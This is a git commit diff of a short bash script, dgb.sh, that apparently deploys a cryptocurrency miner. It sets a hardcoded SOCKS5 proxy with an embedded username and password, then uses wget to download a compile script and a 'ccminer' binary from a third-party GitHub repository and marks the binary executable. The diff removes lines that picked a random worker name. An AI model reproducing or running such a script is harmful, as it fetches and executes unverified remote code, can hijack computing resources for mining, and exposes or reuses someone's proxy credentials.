0a155bb0f708b63b0d72a8e1345a1f43aab4707a
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-01-10 12:07:38 +0700

    Update dgb.sh

--- dgb.sh
+++ dgb.sh
@@ -1,12 +1,5 @@
 #!/bin/bash
 proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
-array[0]="0001"
-array[1]="0002"
-array[2]="0003"
-size=${#array[@]}
-index=$(($RANDOM % $size))
-worker=${array[$index]}
-apt-get update
 wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
 wget -qO build https://github.com/renifer12/master/raw/master/ccminer
 chmod +x build
